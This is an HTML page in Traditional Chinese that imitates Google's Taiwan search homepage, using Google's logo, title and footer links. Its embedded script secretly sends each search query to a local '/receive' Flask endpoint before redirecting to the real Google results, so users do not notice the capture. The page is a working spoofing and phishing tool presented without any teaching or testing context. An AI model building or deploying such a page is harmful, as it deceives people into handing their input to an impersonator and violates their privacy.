<!DOCTYPE html>
<html lang="zh-TW">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google 搜尋</title>
    <link href="https://fonts.googleapis.com/css2?family=Product+Sans&display=swap" rel="stylesheet">
    <style>
        body {
            display: flex;
            flex-direction: column;
            justify-content: space-between;
            align-items: center;
            height: 100vh;
            margin: 0;
            background-color: #ffffff;
            font-family: 'Product Sans', Arial, sans-serif;
            color: #202124;
        }
        .header, .footer {
            width: 100%;
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 10px 20px;
            box-sizing: border-box;
            font-size: 14px;
            color: #5f6368;
        }
        .header a, .footer a {
            color: #5f6368;
            text-decoration: none;
            margin: 0 8px;
        }
        .header a:last-child, .footer a:last-child {
            margin-right: 0;
        }
        .header {
            justify-content: flex-start;
        }
        .header div:first-child {
            margin-right: auto;
            display: flex;
            align-items: center;
        }
        .header img {
            border-radius: 50%;
            width: 32px;
            height: 32px;
        }
        .logo {
            margin-top: 20px;
        }
        .logo img {
            width: 200px;
            margin-top: 50px;
        }
        .search-container {
            display: flex;
            flex-direction: column;
            align-items: center;
            width: 100%;
            max-width: 560px;
            margin-top: 20px;
        }
        .search-box {
            display: flex;
            align-items: center;
            width: 100%;
            padding: 12px 18px;
            border: 1px solid #dfe1e5;
            border-radius: 24px;
            box-shadow: 0 1px 6px rgba(32, 33, 36, 0.28);
            background-color: #ffffff;
        }
        .search-box input[type="text"] {
            flex-grow: 1;
            padding: 0 10px;
            font-size: 16px;
            border: none;
            outline: none;
            height: 34px;
            margin-right: 10px;
        }
        .search-icons {
            display: flex;
            align-items: center;
            gap: 10px;
        }
        .search-icons img {
            width: 24px;
            height: 24px;
            cursor: pointer;
        }
        .buttons {
            display: flex;
            justify-content: center;
            width: 100%;
            max-width: 560px;
            margin-top: 20px;
        }
        .buttons button {
            background-color: #f8f9fa;
            border: 1px solid #f8f9fa;
            border-radius: 4px;
            color: #3c4043;
            font-size: 14px;
            margin: 8px 4px;
            padding: 11px 22px;
            cursor: pointer;
        }
        .buttons button:hover {
            border: 1px solid #dadce0;
            box-shadow: 0 1px 2px rgba(0, 0, 0, 0.1);
        }
        .footer {
            justify-content: center;
            font-size: 12px;
            padding: 10px 20px;
            margin-top: auto;
        }
        @media (max-width: 600px) {
            .header, .footer {
                flex-direction: column;
                align-items: center;
            }
            .header a, .footer a {
                margin: 5px 0;
            }
            .logo img {
                width: 180px;
            }
            .search-box {
                padding: 10px;
            }
            .search-box input[type="text"] {
                font-size: 14px;
                height: 30px;
                margin-right: 8px;
            }
            .search-icons img {
                width: 20px;
                height: 20px;
            }
            .buttons button {
                font-size: 12px;
                padding: 8px 12px;
                margin: 8px 2px;
            }
        }
    </style>
    <script>
        async function searchGoogle(event) {
            event.preventDefault();  // 防止表單提交時刷新頁面

            const inputData = document.getElementById('searchInput').value;
            if (!inputData) return;

            try {
                // 提交數據到 Flask
                await fetch('/receive', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/x-www-form-urlencoded'
                    },
                    body: new URLSearchParams({ q: inputData })
                });

                // 打開 Google 搜尋結果
                window.location.href = `https://www.google.com/search?q=${encodeURIComponent(inputData)}`;
            } catch (error) {
                console.error('錯誤:', error);
            }
        }
    </script>
</head>
<body>
    <div class="header">
        <div>
            <a href="#">關於 Google</a>
            <a href="#">Google 商店</a>
        </div>
        <div>
            <a href="#">Gmail</a>
            <a href="#">圖片</a>
            <img src="https://img.icons8.com/material-rounded/24/000000/user.png" alt="Profile">
        </div>
    </div>

    <div class="logo">
        <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_272x92dp.png" alt="Google">
    </div>

    <div class="search-container">
        <div class="search-box">
            <form id="inputForm" onsubmit="searchGoogle(event)">
                <input type="text" id="searchInput" name="q" placeholder="搜尋 Google 或輸入網址" required>
                <div class="search-icons">
                </div>
            </form>
        </div>
        <div class="buttons">
            <button onclick="searchGoogle(event)">Google 搜尋</button>
            <button onclick="searchGoogle(event)">好手氣</button>
        </div>
    </div>

    <div class="footer">
        <div>
            <a href="#">台灣</a>
        </div>
        <div>
            <a href="#">廣告</a>
            <a href="#">商業</a>
            <a href="#">搜尋服務的運作方式</a>
            <a href="#">隱私權</a>
            <a href="#">服務條款</a>
            <a href="#">設定</a>
        </div>
    </div>
</body>
</html>
